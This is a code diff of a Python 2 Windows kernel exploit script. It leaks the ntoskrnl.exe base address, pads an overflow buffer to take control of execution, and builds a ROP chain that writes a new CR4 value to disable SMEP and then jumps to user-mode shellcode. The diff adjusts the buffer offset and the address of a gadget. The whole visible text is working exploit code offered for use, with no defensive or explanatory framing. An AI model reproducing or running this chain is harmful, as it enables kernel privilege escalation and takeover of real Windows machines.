@@ -347,11 +347,9 @@ print "[+] Found kernel leak!"
 print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
 
 # Offset to control execution
-input_buffer = "\x41" * 2056
+input_buffer = ("\x41" * 2048 + "\x42" * 8)
 
 # SMEP says goodbye
-# First ROP Gadget will go here
-
 print "[+] Starting ROP chain. Goodbye SMEP..."
 input_buffer += struct.pack('<Q', kernel_address + 0x1684f0)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
 
@@ -359,7 +357,7 @@ print "[+] Flipped SMEP bit to 0 in RCX..."
 input_buffer += struct.pack('<Q', 0x00000000000506f8)            # Intended CR4 value
 
 print "[+] Placed disabled SMEP value in CR4..."
-input_buffer += struct.pack('<Q', kernel_address + 0x4265221)    # mov cr4, rcx ; ret ; nt!KiEnableXSave+0x6a08
+input_buffer += struct.pack('<Q', kernel_address + 0x411505)    # mov cr4, rcx ; ret ; nt!KiEnableXSave+0x6a08
 
 print "[+] SMEP disabled!"
 input_buffer += struct.pack('<Q', ptr)                           # Location of user mode shellcode
